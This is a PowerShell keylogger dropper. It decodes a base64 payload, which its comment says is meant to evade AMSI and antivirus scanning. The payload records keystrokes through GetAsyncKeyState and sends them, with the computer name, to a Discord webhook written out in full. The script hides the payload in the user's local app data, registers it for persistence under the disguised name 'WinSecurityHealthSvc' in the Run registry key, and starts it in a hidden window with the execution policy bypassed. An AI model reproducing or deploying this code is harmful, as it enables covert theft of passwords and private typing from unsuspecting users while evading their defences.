# Configuration
$W = "https://discord.com/api/webhooks/1504038539984113755/-YlOeox0lAsJLUETBjQImcHlD7PzbLacAjOetUX3pNDhkDBGkGZn4oGM-vGmnl_5LMHX" # Replace this
$P = "WinSecurityHealthSvc"
$F = "$env:LOCALAPPDATA\win_health.ps1"

# The logic encoded to bypass AMSI/ESET scanners
$EncodedLogic = "JFcCA9ICdZPVVfTkVXX0RJU0NPUkRfV0VCSE9PS19VUkwnOyBOID0gJGVudjpDT01QVVRFUk5BTUU7IEwgPSAnJztBZGQtVHlwZSAtVHlwZSAndXNpbmcgU3lzdGVtO3VzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcztwdWJsaWMgY2xhc3MgS3tbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildcHVibGljIHN0YXRpYyBleHRlcm4gc2hvcnQgR2V0QXN5bmNLZXlTdGF0ZShpbnQgdik7fSc7d2hpbGUoMSl7U3RhcnQtU2xlZXAgLW0gNDA7Zm9yKCRpPTg7JGkgLWxlIDE5MDskisspO2lmKFtLXTo6R2V0QXN5bmNLZXlTdGF0ZSgkaSkgLWVxIC0zMjc2Nyl7JGsgPSBbY2hhcl0kaTsgaWYgKCRrIC1lcSAnIicpIHsgJGsgPSAnIicgfTsgaWYgKCRrIC1lcSAnXCcpIHsgJGsgPSAnLycgfTsgTCArPSAkazsgIGlmIChMLkxlbmd0aCAtZ2UgMjUpIHsgJFBheWxvYWQgPSBAe3VzZXJuYW1lID0gIkdIT1NUXyROICI7IGNvbnRlbnQgID0gIlsktiBOIF06IEwgIn0gfCBDb252ZXJ0VG8tSnNvbjsgdHJ5IHsgSW52b2tlLVJlc3RNZXRob2QgLVVyaSBXIC1NZXRob2QgUG9zdCAtQm9keSBQYXlsb2FkIC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiIgfSBjYXRjaCB7IFN0YXJ0LVNsZWVwIC1zIDEwIH07IEwgPSAnJyB9IH0gfSB9"

$Decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedLogic))

# Replace the placeholder URL in the decoded string
$FinalLogic = $Decoded.Replace("https://discord.com/api/webhooks/1504038539984113755/-YlOeox0lAsJLUETBjQImcHlD7PzbLacAjOetUX3pNDhkDBGkGZn4oGM-vGmnl_5LMHX", $W)

if (-not (Test-Path $F)) {
    $FinalLogic | Out-File -FilePath $F -Encoding ascii -Force
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $P -Value "powershell.exe -W H -Exec Bypass -File `"$F`"" -PropertyType String -Force
}

Start-Process powershell.exe -ArgumentList "-W H -NoP -Exec Bypass -File `"$F`"" -WindowStyle Hidden
